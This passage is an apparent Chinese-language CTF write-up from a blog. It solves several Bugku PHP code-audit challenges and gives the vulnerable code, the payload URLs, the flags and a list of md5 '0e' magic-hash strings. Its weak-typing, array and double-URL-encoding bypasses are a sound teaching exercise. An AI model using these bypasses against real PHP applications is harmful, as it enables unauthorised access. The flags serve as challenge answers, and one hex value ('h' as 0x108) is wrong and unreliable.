如果找到与 pattern 中圆括号内的子模式相匹配的子串并且函数调用给出了第三个参数 regs，则匹配项将被存入 regs 数组中。&lt;/span&gt;&lt;span&gt;$regs&lt;/span&gt;[1] 包含第一个左圆括号开始的子串，&lt;span&gt;$regs&lt;/span&gt;[2] 包含第二个子串，以此类推。&lt;span&gt;$regs&lt;/span&gt;[0&lt;span&gt;] 包含整个匹配的字符串。 

如果在 &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; 中找到 pattern 模式的匹配则返回所匹配字符串的长度，如果没有找到匹配或出错则返回 &lt;span&gt;FALSE&lt;/span&gt;。如果没有传递入可选参数 regs 或者所匹配的字符串长度为 0，则本函数返回 1。 
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;题目信息&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Topic Link：&lt;a href=&quot;http://123.206.87.240:9009/10.php&quot;&gt;http://123.206.87.240:9009/10.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201902/1594459-20190215193545948-1391783086.png&quot; alt=&quot;&quot; width=&quot;314&quot; height=&quot;413&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;eregi&lt;/span&gt;(&quot;hackerDJ&quot;,&lt;span&gt;$_GET&lt;/span&gt;&lt;span&gt;[id])) {
&lt;/span&gt;&lt;span&gt;echo&lt;/span&gt;(&quot;&lt;span&gt;

not allowed!

&lt;/span&gt;&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;exit&lt;/span&gt;&lt;span&gt;();
}
&lt;/span&gt;&lt;span&gt;$_GET&lt;/span&gt;[id] = &lt;span&gt;urldecode&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;&lt;span&gt;[id]);
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;[id] == &quot;hackerDJ&quot;&lt;span&gt;)
{
&lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;&lt;span&gt;
Access granted!

&lt;/span&gt;&quot;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;&lt;span&gt;
flag

&lt;/span&gt;&quot;&lt;span&gt;;
}
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;利用浏览器默认对提交的数据进行一次url解码&lt;/p&gt;
&lt;p&gt;代码审计需要满足两个条件：1. id里面不能包含字符串“hackerDJ”&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　　　　2. id经过urldecode()之后等于字符串“hackerDJ”&lt;/p&gt;
&lt;p&gt;构造payload：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre readability=&quot;5&quot;&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;只需对字符串&quot;hackerDJ&quot;一部分二次url编码即可&lt;/span&gt;
&lt;span&gt;
h对应的十六进制码为0x108

&lt;/span&gt;%108进行一次url编码%2568&lt;p&gt;http://123.206.87.240:9009/10.php?id=%2568ackerDJ
&lt;/p&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;get flag:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
Access granted!&lt;span&gt;

flag{bugku__daimasj&lt;/span&gt;-1t2} 
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;第四题：md5()函数&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;知识简介&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; MD5()函数语法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;md5&lt;/span&gt; — 计算字符串的 &lt;span&gt;MD5&lt;/span&gt;&lt;span&gt; 散列值

&lt;/span&gt;&lt;span&gt;string&lt;/span&gt; &lt;span&gt;md5&lt;/span&gt;( &lt;span&gt;string&lt;/span&gt; &lt;span&gt;$str&lt;/span&gt;[, bool &lt;span&gt;$raw_output&lt;/span&gt; = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;] )


参数 

str
原始字符串。 
raw_output
如果可选的 raw_output 被设置为 &lt;/span&gt;&lt;span&gt;TRUE&lt;/span&gt;，那么 &lt;span&gt;MD5&lt;/span&gt;&lt;span&gt; 报文摘要将以16字节长度的原始二进制格式返回。 


返回值 

以 &lt;/span&gt;32 字符十六进制数字形式返回散列值。 
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;题目信息&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Topic Link：&lt;a href=&quot;http://123.206.87.240:9009/18.php&quot;&gt;http://123.206.87.240:9009/18.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201902/1594459-20190215201224939-58209549.png&quot; alt=&quot;&quot; width=&quot;342&quot; height=&quot;296&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;error_reporting&lt;/span&gt;(0&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;$flag&lt;/span&gt; = 'flag{test}'&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['username']) and &lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['password'&lt;span&gt;])) {
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;$_GET&lt;/span&gt;['username'] == &lt;span&gt;$_GET&lt;/span&gt;['password'&lt;span&gt;])
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt; 'Your password can not be your username.'&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (&lt;span&gt;md5&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['username']) === &lt;span&gt;md5&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['password'&lt;span&gt;]))
&lt;/span&gt;&lt;span&gt;die&lt;/span&gt;('Flag: '.&lt;span&gt;$flag&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt; 'Invalid password'&lt;span&gt;;
}
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;利用MD5函数不能处理数组进行构造payload&lt;/p&gt;
&lt;p&gt;代码审计需要满足两个条件：1. username和password的值不能相同&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　　　　2. username和password的MD5值相同&lt;/p&gt;
&lt;p&gt;构造payload：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;123.206.87.240:9009/18.php?username[]=999&amp;amp;password[]=666&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;get flag:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
Flag: flag{bugk1u-ad8-3dsa-2}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;第五题：数组返回NULL绕过&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt; 知识简介&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ereg()函数语法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
int &lt;span&gt;ereg&lt;/span&gt; ( &lt;span&gt;string&lt;/span&gt; &lt;span&gt;$pattern&lt;/span&gt; , &lt;span&gt;string&lt;/span&gt; &lt;span&gt;$string&lt;/span&gt; [, &lt;span&gt;array&lt;/span&gt; &amp;amp;&lt;span&gt;$regs&lt;/span&gt;&lt;span&gt; ] )

以区分大小写的方式在 &lt;/span&gt;&lt;span&gt;string&lt;/span&gt;&lt;span&gt; 中寻找与给定的正则表达式 pattern 所匹配的子串。 

如果找到与 pattern 中圆括号内的子模式相匹配的子串并且函数调用给出了第三个参数 regs，则匹配项将被存入 regs 数组中。&lt;/span&gt;&lt;span&gt;$regs&lt;/span&gt;[1] 包含第一个左圆括号开始的子串，&lt;span&gt;$regs&lt;/span&gt;[2] 包含第二个子串，以此类推。&lt;span&gt;$regs&lt;/span&gt;[0&lt;span&gt;] 包含整个匹配的字符串。 

如果在 &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; 中找到 pattern 模式的匹配则返回所匹配字符串的长度，如果没有找到匹配或出错则返回 &lt;span&gt;FALSE&lt;/span&gt;。如果没有传递入可选参数 regs 或者所匹配的字符串长度为 0，则本函数返回 1。 
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; strpos()函数语法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;strpos&lt;/span&gt;&lt;span&gt; — 查找字符串首次出现的位置

int &lt;/span&gt;&lt;span&gt;strpos&lt;/span&gt;( &lt;span&gt;string&lt;/span&gt; &lt;span&gt;$haystack&lt;/span&gt;, &lt;span&gt;mixed&lt;/span&gt; &lt;span&gt;$needle&lt;/span&gt;[, int &lt;span&gt;$offset&lt;/span&gt; = 0&lt;span&gt;] )

返回 needle 在 haystack 中首次出现的数字位置。 


参数 

haystack
在该字符串中进行查找。 
needle
如果 needle 不是一个字符串，那么它将被转换为整型并被视为字符的顺序值。 
offset
如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。如果是负数，搜索会从字符串结尾指定字符数开始。 


返回值 

返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。 

如果没找到 needle，将返回 &lt;/span&gt;&lt;span&gt;FALSE&lt;/span&gt;。 
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;题目信息&lt;/p&gt;
&lt;p&gt;Topic Link：&lt;a href=&quot;http://123.206.87.240:9009/19.php&quot;&gt;http://123.206.87.240:9009/19.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201902/1594459-20190215202637095-590418874.png&quot; alt=&quot;&quot; width=&quot;292&quot; height=&quot;262&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;$flag&lt;/span&gt; = &quot;flag&quot;&lt;span&gt;;

&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;isset&lt;/span&gt; (&lt;span&gt;$_GET&lt;/span&gt;['password'&lt;span&gt;])) {
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;ereg&lt;/span&gt; (&quot;^[a-zA-Z0-9]+$&quot;, &lt;span&gt;$_GET&lt;/span&gt;['password']) === &lt;span&gt;FALSE&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; 'You password must be alphanumeric'&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (&lt;span&gt;strpos&lt;/span&gt; (&lt;span&gt;$_GET&lt;/span&gt;['password'], '--') !== &lt;span&gt;FALSE&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;die&lt;/span&gt;('Flag: ' . &lt;span&gt;$flag&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;
&lt;span&gt;echo&lt;/span&gt; 'Invalid password'&lt;span&gt;;
}
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;利用strpos()函数不能处理数组的漏洞构造payload&lt;/p&gt;
&lt;p&gt;代码审计需要满足两个条件：1. if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET['password']) === FALSE)   == 》 FALSE&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　　　　2. if (strpos ($_GET['password'], '--') !== FALSE)   == 》 TRUE&lt;/p&gt;
&lt;p&gt;构造payload：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;123.206.87.240:9009/19.php?password[]=&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;get flag:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
Flag: flag{ctf-bugku-ad-2131212}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;第六题：弱类型整数大小比较绕过&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt; 知识简介&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;is_numeric()函数语法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;is_numeric&lt;/span&gt;&lt;span&gt; — 检测变量是否为数字或数字字符串 

bool &lt;/span&gt;&lt;span&gt;is_numeric&lt;/span&gt;( &lt;span&gt;mixed&lt;/span&gt; &lt;span&gt;$var&lt;/span&gt;&lt;span&gt;)

如果 &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; 是数字和数字字符串则返回 &lt;span&gt;TRUE&lt;/span&gt;，否则返回 &lt;span&gt;FALSE&lt;/span&gt;。
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;题目信息&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Topic Link：&lt;a href=&quot;http://123.206.87.240:9009/22.php&quot;&gt;http://123.206.87.240:9009/22.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201902/1594459-20190215204847289-421662579.png&quot; alt=&quot;&quot; width=&quot;311&quot; height=&quot;165&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;$temp&lt;/span&gt; = &lt;span&gt;$_GET&lt;/span&gt;['password'&lt;span&gt;];
&lt;/span&gt;&lt;span&gt;is_numeric&lt;/span&gt;(&lt;span&gt;$temp&lt;/span&gt;)?&lt;span&gt;die&lt;/span&gt;(&quot;no numeric&quot;):&lt;span&gt;NULL&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;$temp&lt;/span&gt;&amp;gt;1336&lt;span&gt;){
&lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &lt;span&gt;$flag&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;利用php弱类型漏洞构造payload&lt;/p&gt;
&lt;p&gt;代码审计需要满足两个条件：1. is_numeric($temp)  ==》 FALSE&lt;/p&gt;
&lt;p&gt; 　　　　　　　　　　　　   2. if($temp&amp;gt;1336)  ==》 TRUE&lt;/p&gt;
&lt;p&gt;构造payload：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;123.206.87.240:9009/22.php?password=99999asd&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;get flag:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
flag{bugku_null_numeric}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;第七题：sha()函数比较绕过&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt; 知识简介&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;sha1()函数语法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
(PHP 4 &amp;gt;= 4.3.0, PHP 5, PHP 7&lt;span&gt;)

&lt;/span&gt;&lt;span&gt;sha1&lt;/span&gt; — 计算字符串的 &lt;span&gt;sha1&lt;/span&gt;&lt;span&gt; 散列值

&lt;/span&gt;&lt;span&gt;string&lt;/span&gt; &lt;span&gt;sha1&lt;/span&gt;( &lt;span&gt;string&lt;/span&gt; &lt;span&gt;$str&lt;/span&gt;[, bool &lt;span&gt;$raw_output&lt;/span&gt; = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;] )


参数 

str
输入字符串。 
raw_output
如果可选的 raw_output 参数被设置为 &lt;/span&gt;&lt;span&gt;TRUE&lt;/span&gt;，那么 &lt;span&gt;sha1&lt;/span&gt; 摘要将以 20 字符长度的原始格式返回，否则返回值是一个 40&lt;span&gt; 字符长度的十六进制数字。 


返回值 

返回 &lt;/span&gt;&lt;span&gt;sha1&lt;/span&gt; 散列值字符串。 
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;题目信息&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Topic Link：&lt;a href=&quot;http://123.206.87.240:9009/7.php&quot;&gt;http://123.206.87.240:9009/7.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201902/1594459-20190215205816276-1361841729.png&quot; alt=&quot;&quot; width=&quot;282&quot; height=&quot;488&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;$flag&lt;/span&gt; = &quot;flag&quot;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['name']) and &lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['password'&lt;span&gt;]))
{
&lt;/span&gt;&lt;span&gt;var_dump&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['name'&lt;span&gt;]);
&lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;
&quot;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;var_dump&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['password'&lt;span&gt;]);
&lt;/span&gt;&lt;span&gt;var_dump&lt;/span&gt;(&lt;span&gt;sha1&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['name'&lt;span&gt;]));
&lt;/span&gt;&lt;span&gt;var_dump&lt;/span&gt;(&lt;span&gt;sha1&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['password'&lt;span&gt;]));
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;$_GET&lt;/span&gt;['name'] == &lt;span&gt;$_GET&lt;/span&gt;['password'&lt;span&gt;])
&lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; '&lt;span&gt;

Your password can not be your name!

&lt;/span&gt;'&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (&lt;span&gt;sha1&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['name']) === &lt;span&gt;sha1&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['password'&lt;span&gt;]))
&lt;/span&gt;&lt;span&gt;die&lt;/span&gt;('Flag: '.&lt;span&gt;$flag&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;
&lt;span&gt;echo&lt;/span&gt; '&lt;span&gt;
Invalid password.

&lt;/span&gt;'&lt;span&gt;;
}
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;
&lt;span&gt;echo&lt;/span&gt; '&lt;span&gt;
Login first!

&lt;/span&gt;'&lt;span&gt;;
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;利用sha1函数不能处理数组进行构造payload&lt;/p&gt;
&lt;p&gt;代码审计需要满足三个条件：1. if (isset($_GET['name']) and isset($_GET['password'])) ==》TRUE&lt;/p&gt;
&lt;p&gt; 　　　　　　　　　　　　   2. if ($_GET['name'] == $_GET['password']) ==》FALSE&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　　　    3. if (sha1($_GET['name']) === sha1($_GET['password'])) ==》TRUE&lt;/p&gt;
&lt;p&gt;构造payload：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;123.206.87.240:9009/7.php?name[]=999&amp;amp;password[]=99999&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;get flag:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
Flag: flag{bugku--daimasj-a2}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;第八题：md5加密相等绕过&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt; 知识简介&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; MD5()函数语法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
md5 — 计算字符串的 MD5&lt;span&gt; 散列值

string md5( string $str[, bool $raw_output = false&lt;span&gt;] )


参数 

str
原始字符串。 
raw_output
如果可选的 raw_output 被设置为 TRUE，那么 MD5&lt;span&gt; 报文摘要将以16字节长度的原始二进制格式返回。 


返回值 

以 32 字符十六进制数字形式返回散列值。 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;题目信息&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Topic Link：&lt;a href=&quot;http://123.206.87.240:9009/13.php&quot;&gt;http://123.206.87.240:9009/13.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201902/1594459-20190215210559551-899848316.png&quot; alt=&quot;&quot; width=&quot;291&quot; height=&quot;282&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;$md51&lt;/span&gt; = &lt;span&gt;md5&lt;/span&gt;('QNKCDZO'&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;$a&lt;/span&gt; = @&lt;span&gt;$_GET&lt;/span&gt;['a'&lt;span&gt;];
&lt;/span&gt;&lt;span&gt;$md52&lt;/span&gt; = @&lt;span&gt;md5&lt;/span&gt;(&lt;span&gt;$a&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$a&lt;/span&gt;&lt;span&gt;)){
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;$a&lt;/span&gt; != 'QNKCDZO' &amp;amp;&amp;amp; &lt;span&gt;$md51&lt;/span&gt; == &lt;span&gt;$md52&lt;/span&gt;&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;flag{*}&quot;&lt;span&gt;;
} &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;false!!!&quot;&lt;span&gt;;
}}
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;{&lt;span&gt;echo&lt;/span&gt; &quot;please input a&quot;&lt;span&gt;;}
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;利用MD5函数处理的特殊字符串进行绕过构造payload&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;下面的特殊字符串经过MD5函数处理过之后相等&lt;/span&gt;
&lt;span&gt;
QNKCDZO
&lt;/span&gt;0e830400451993494058024219903391&lt;span&gt;

s878926199a
&lt;/span&gt;0e545993274517709034328855841020&lt;span&gt;
  
s155964671a
&lt;/span&gt;0e342768416822451524974117254469&lt;span&gt;
  
s214587387a
&lt;/span&gt;0e848240448830537924465865611904&lt;span&gt;
  
s214587387a
&lt;/span&gt;0e848240448830537924465865611904&lt;span&gt;
  
s878926199a
&lt;/span&gt;0e545993274517709034328855841020&lt;span&gt;
  
s1091221200a
&lt;/span&gt;0e940624217856561557816327384675&lt;span&gt;
  
s1885207154a
&lt;/span&gt;0e509367213418206700842008763514
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;代码审计需要满足两个条件：1. if(isset($a)) ==》TRUE&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　　　　2. if ($a != 'QNKCDZO' &amp;amp;&amp;amp; $md51 == $md52) ==》TRUE&lt;/p&gt;
&lt;p&gt;构造payload：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;123.206.87.240:9009/13.php?a=s878926199a&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;get flag:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
flag{bugku-dmsj-am9ls}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;第九题：十六进制与数字比较&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt; 知识简介&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ord()函数语法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
int &lt;span&gt;ord&lt;/span&gt;( &lt;span&gt;string&lt;/span&gt; &lt;span&gt;$string&lt;/span&gt;&lt;span&gt;)

返回字符串 &lt;/span&gt;&lt;span&gt;string&lt;/span&gt;&lt;span&gt; 第一个字符的 ASCII 码值。 

该函数是 &lt;/span&gt;&lt;span&gt;chr&lt;/span&gt;&lt;span&gt;() 的互补函数。 


参数 

&lt;/span&gt;&lt;span&gt;string&lt;/span&gt;&lt;span&gt;
一个字符。 

返回值 

返回整型的 ASCII 码值。 &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;题目信息&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Topic Link：&lt;a href=&quot;http://123.206.87.240:9009/20.php&quot;&gt;http://123.206.87.240:9009/20.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201902/1594459-20190215220651227-1632726813.png&quot; alt=&quot;&quot; width=&quot;291&quot; height=&quot;357&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;error_reporting&lt;/span&gt;(0&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;function&lt;/span&gt; noother_says_correct(&lt;span&gt;$temp&lt;/span&gt;&lt;span&gt;)
{
&lt;/span&gt;&lt;span&gt;$flag&lt;/span&gt; = 'flag{test}'&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;$one&lt;/span&gt; = &lt;span&gt;ord&lt;/span&gt;('1'); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;ord — 返回字符的 ASCII 码值&lt;/span&gt;
&lt;span&gt;$nine&lt;/span&gt; = &lt;span&gt;ord&lt;/span&gt;('9'); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;ord — 返回字符的 ASCII 码值&lt;/span&gt;
&lt;span&gt;$number&lt;/span&gt; = '3735929054'&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Check all the input characters!&lt;/span&gt;
